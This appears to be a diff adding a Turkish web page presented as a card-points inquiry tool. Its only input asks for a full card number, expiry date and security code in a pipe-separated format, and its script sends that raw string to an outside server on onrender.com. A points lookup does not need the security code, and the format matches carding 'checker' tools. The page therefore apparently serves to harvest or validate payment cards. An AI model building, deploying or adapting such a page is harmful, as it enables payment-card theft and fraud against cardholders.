@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Puan Sorgu</title>
+</head>
+<body>
+  <h2>Kart Puan Sorgulama</h2>
+  <input type="text" id="card" placeholder="4543xxxxxxxxxxxx|05|2027|000">
+  <button onclick="kontrolEt()">Sorgula</button>
+  <pre id="sonuc"></pre>
+
+  <script>
+    async function kontrolEt() {
+      const card = document.getElementById("card").value;
+      const sonuc = document.getElementById("sonuc");
+
+      try {
+        const res = await fetch("https://hzquarex-puan.onrender.com/api/puan", {
+          method: "POST",
+          headers: { "Content-Type": "text/plain" },
+          body: card
+        });
+
+        const text = await res.text();
+        sonuc.textContent = text;
+      } catch (e) {
+        sonuc.textContent = "Hata oluştu: " + e;
+      }
+    }
+  </script>
+</body>
+</html>
